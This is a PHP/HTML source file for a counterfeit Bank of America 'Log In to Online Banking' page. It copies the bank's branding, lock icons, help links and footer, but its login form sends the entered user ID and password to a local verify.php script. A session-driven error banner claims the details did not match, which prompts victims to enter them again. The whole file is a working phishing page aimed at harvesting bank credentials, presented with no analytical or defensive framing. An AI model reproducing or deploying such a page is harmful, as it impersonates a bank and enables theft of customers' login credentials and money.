<!DOCTYPE HTML>
<?php session_start(); ?>
<html>
    <head>
    <link rel="icon" type="image/x-icon" href="favicon.ico"/>
    <title> Bank of America | Online Banking | Log In | User ID </title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        html{
            height: 100%;
            overflow:hidden;
        }
        body{
            min-height: 100%;
        }
        .mainDiv{
            padding: 0px 10px 0px 10px;
            position: absolute;
            margin:auto;
            width:1000px;
            height:1000px;
            top:0;
            left:0;
            right:0;
            bottom:0;
        }
        .headerDiv{
            display:inline-block;
            vertical-align: middle;
            font-family: sans-serif, Helvetica;
            color:#36454F;
        }
        .errorPopup{
            margin-top:20px;
            margin-left: 20px;
            width:880px;
            height: 115px;
            border: 1px solid #C41E3A;
            font-family: sans-serif, Helvetica;
            color:#36454F;
        }
        .bodyDiv{
            display:inline-block;
            vertical-align: middle;
        }
        .signDiv{
            display:inline-block;
            vertical-align: middle;
            width: 330px;
            height: 270px;
            margin-top: 30px;
            margin-left: 20px;
            font-family: sans-serif, Helvetica;
            color:#36454F;
        }
        .appDiv{
            display:inline-block;
            vertical-align: middle;
            border-left: 1px solid #D3D3D3;
            width: 360px; 
            height: 270px;
            margin-top: 30px;
            color:#36454F;
        }
        .otherDiv{
            display:inline-block;
            vertical-align: middle; 
            width:170px;
            height: 270px;
            margin-top: 30px;
            font-family: sans-serif, Helvetica;
            color:#36454F;
        }
        .rectDiv{
            background-image: linear-gradient(#DC1431,#C41230);
            color:white;
            width:100%;
            height:58px;
            margin-top: -60px;
            font-family: serif, "Times New Roman";
        }
        .rectDiv p{
            position:relative;
            top: 17px;
            margin-left:26px;
            font-size: 20px;
        }
        .footerDiv{
            background-color: #F3EFEA;
            margin-top:100px;
            width:890px;
            height:130px;
            padding-left: 25px;
            font-size: 12px;
            font-family: sans-serif, Helvetica;
            color:#36454F;
        }
        .logIn{
            width:85px;
            height:25px;
            border-radius:5px;
            border-color: transparent;
            background-image: linear-gradient(#007CC2,#0068B2);
            color:white;
            font-weight: bold;
            font-family: sans-serif, Helvetica;
        }
        .logIn:hover{
            background-image: linear-gradient(#0068B2,#007CC2);
        }
        .getApp{
            width: 120px;
            height: 38px;
            font-size:16px;
            color:white;
            background-image: linear-gradient(#DC1431,#C41230);
            border-radius: 5px;
            border-color: transparent;
            font-weight: bold;
        }
        .getApp:hover{
            background-image: linear-gradient(#C41230,#DC1431);
        }
        .link{
            text-decoration:none;
            font-size: 10.8px;
            color:#0F52BA;
        }
        .link:hover{
            text-decoration:underline;
        }
        input[type="checkbox"]:hover{
            border-color:black;
        }
        input[type="username"]:target{
            border-radius: 2px;
        }
    </style>
    </head>
    <body>
        <div class="mainDiv">
            <div class="headerDiv">
                <img class="headerDiv" style="width:240px; height:160px; padding-left:20px;" src="BOA.png"/>
                <p class="headerDiv" style="padding-left:20px; font-size:20px;color:grey;"> Log In </p> 
                <img class="headerDiv" style="width:11px; height:15px; padding-bottom: 0px; padding-left: 430px; text-align:right" src="lock.png"/>
                <p class="headerDiv" style="font-size: 11px; font-weight: bold; text-align:right">Secure Area&nbsp</p>
                <p class="headerDiv" style="font-size: 10px; text-align:right; border-left: 1px dotted grey">&nbsp En español</p>
                <div class="rectDiv">
                    <p>Log In to Online Banking</p>
                </div>
            </div>
            <?php 
                if(isset($_SESSION['nouser'])){
                    echo '<div class="errorPopup" id="errorp">
                    <div style="background-color:#F9DEE1; width:65px; height:100%;">
                        <img src="alert.png" style="margin-top:9px; margin-left:5px;"/>
                    </div>
                    <div style="height: 10px; width: 805px; margin-left: 80px; margin-top: -105px;">
                        <p style= "display:inline-block; font-size:10.5px;"> The information you entered doesn\'t match our records. You have a few more tries remaining. <br> Please try again or click <a href="https://secure.bankofamerica.com/auth/forgot/reset-entry/" style="color:#0F52BA; text-decoration:none;">Forgot ID/Password</a></p>
                        <p style="font-size:10.5px;"><b>Having problems logging in or resetting your Password?</b>If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. 
                        <a href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/" style="text-decoration:none; color:#0F52BA; font-size: 12px;">Learn more</a></p>
                    </div>
                </div>';
                    unset($_SESSION['nouser']);
                    unset($_SESSION['nopass']);
                }
            ?>
            <div class="bodyDiv">
                <div class="signDiv">
                    <form action="verify.php" method="post">
                        <label style="font-size: 20px;"> User ID </label><br>
                        <input name="user" type="username" style="margin-top:5px; margin-bottom:10px; width: 210px; height:20px; border-radius:0px; border:1px solid #D3D3D3;"><br>
                        <label for="Save this User ID"><input id="signCheck" type="checkbox" style="margin-bottom:45px; height:14px; width:14px;">Save this User ID</label><br>
                        <label style="font-size: 20px;"> Password </label><br>
                        <input name="pass" type="password" style="margin-top:5px; margin-bottom:20px; width: 210px; height:20px; border-radius:0px; border:1px solid #D3D3D3;"><br>
                        <a href="https://secure.bankofamerica.com/auth/forgot/reset-entry/" class="link"> Forgot your Password? </a><br>
                        <button class="logIn" type="submit" style="margin-top:30px;text-align:centers;"> <img src="lock2.png" style="width:12px; height:15px; margin-bottom:-2px; margin-right:1px;" /> Log In </button>
                    </form>
                </div>
                <div class="appDiv">
                    <p style="font-size: 18px; margin-left: 60px; margin-top:3px;"> Stay connected with our app </p>
                    <div style="display:inline-block; vertical-align:top;">
                        <img src="app.png" style="margin-left: 40px; margin-top:-15px; height:230px;">
                        <p style="border-bottom: 1px solid #D3D3D3; margin-top:-22px; width:122px; margin-left:65px;"></p>
                    </div>
                    <div style="display:inline-block; font-size:19px;">
                        <p style="margin-top: 50px; "> Secure, convenient</p>
                        <p style="margin-top:-10px; margin-bottom:-2px;"> banking anytime </p>
                        <button class="getApp" style="margin-top:10px;"> Get the app </button>
                    </div>
                </div>
                <div class="otherDiv">
                    <p style="font-size: 15px; margin-top:-2px;"> Login help </p>
                    <p style="border-bottom: 2px solid #E5E4E2; margin-bottom:10px;"></p>
                    <a class="link" href="https://secure.bankofamerica.com/auth/forgot/reset-entry/"> Forgot ID/Password?</a>
                    <br><br>
                    <a class="link" href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/"> Problem logging in?</a>
                    <p style="font-size: 15px; margin-top: 38px;"> Not using Online Banking?</p>
                    <p style="border-bottom: 2px solid #E5E4E2; margin-bottom:10px;"></p>
                    <a class="link" href="https://secure.bankofamerica.com/auth/enroll/enroll-entry/"> Enroll now</a>
                    <br><br>
                    <a class="link" href="https://www.bankofamerica.com/online-banking/mobile-and-online-banking-features/"> Learn more about Online Banking</a>
                    <br><br>
                    <a class="link" href="https://www.bankofamerica.com/online-banking/service-agreement.go"> Service Agreement</a>
                </div>
            </div>
            <div class="footerDiv">
                <img src="lockr.png" style="padding-right:5px; margin-bottom:-4px; display:inline-block; width:15px; height:19px;"/>
                <p style="display:inline-block; font-weight:bold;"> Secure Area </p>
                <br> 
                <a class="link" href="https://www.bankofamerica.com/security-center/privacy-overview/" target="_blank"> Privacy &nbsp</a>
                <a class="link" href="https://www.bankofamerica.com/security-center/overview/" target="_blank">|&nbsp Security &nbsp</a>
                <a class="link" href="#about">|&nbsp CA Opt-Out Preference Signals Honored </a>
                <br>
                <p style="display:inline-block;"> Bank of America, N.A. Member FDIC. </p>
                <a class="link" href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank"> Equal Housing Lender </a>
                <img src="house.png" style="width:22px; height:16px; margin-bottom:-2px;"/>
                <p style="margin-top: -12px;"> © 2023 Bank of America Corporation. </p>
                
            </div>
            </div>
        </div>
    </body>
</html>